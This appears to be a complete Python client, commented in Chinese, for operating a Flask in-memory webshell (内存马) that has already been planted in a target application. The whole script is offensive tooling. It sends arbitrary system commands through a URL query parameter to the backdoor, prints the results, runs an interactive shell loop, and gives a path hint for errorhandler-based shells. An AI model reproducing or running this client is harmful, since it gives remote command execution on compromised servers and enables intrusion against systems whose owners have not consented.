#!/usr/bin/env python3
"""
Flask内存马交互客户端
用于向已植入内存马的Flask应用发送命令并接收结果
"""

import requests
import argparse
import sys
import readline  # 支持命令历史记录

def send_command(url, cmd, param="cmd"):
    """向内存马发送命令并返回结果"""
    try:
        resp = requests.get(f"{url}?{param}={cmd}", timeout=10)
        return resp.text
    except Exception as e:
        return f"错误: {e}"

def interactive_shell(url, param="cmd", prompt="shell> "):
    """提供交互式shell，持续发送命令"""
    print(f"Flask内存马交互客户端 - 连接到 {url}")
    print("输入'exit'或'quit'退出, 'help'获取帮助\n")
    
    while True:
        try:
            cmd = input(prompt)
            cmd = cmd.strip()
            
            if not cmd:
                continue
            
            if cmd.lower() in ["exit", "quit"]:
                print("退出客户端...")
                break
            
            if cmd.lower() == "help":
                print("\n可用命令:")
                print("  系统命令  - 直接输入系统命令如'whoami', 'ls -la'等")
                print("  cls/clear - 清屏")
                print("  url       - 显示当前连接的URL")
                print("  help      - 显示此帮助")
                print("  exit/quit - 退出客户端\n")
                continue
            
            if cmd.lower() in ["cls", "clear"]:
                print("\033c", end="")  # 清屏
                continue
            
            if cmd.lower() == "url":
                print(f"当前URL: {url}")
                continue
                
            # 发送命令到内存马
            result = send_command(url, cmd, param)
            print(result)
            
        except KeyboardInterrupt:
            print("\n捕获到Ctrl+C，退出中...")
            break
        except Exception as e:
            print(f"错误: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Flask内存马交互客户端')
    parser.add_argument('--url', '-u', default="http://127.0.0.1:5000", 
                        help='内存马URL (默认: http://127.0.0.1:5000)')
    parser.add_argument('--param', '-p', default="cmd", 
                        help='命令参数名 (默认: cmd)')
    parser.add_argument('--path', default="/", 
                        help='路径 (默认: /，对于errorhandler内存马应使用不存在的路径如/nonexistent)')
    parser.add_argument('--command', '-c', 
                        help='直接执行单个命令而不进入交互模式')
    
    args = parser.parse_args()
    
    # 构建完整URL
    full_url = f"{args.url}{args.path}"
    
    if args.command:
        # 执行单个命令
        result = send_command(full_url, args.command, args.param)
        print(result)
    else:
        # 进入交互模式
        try:
            interactive_shell(full_url, args.param)
        except KeyboardInterrupt:
            print("\n退出客户端...")
            sys.exit(0) 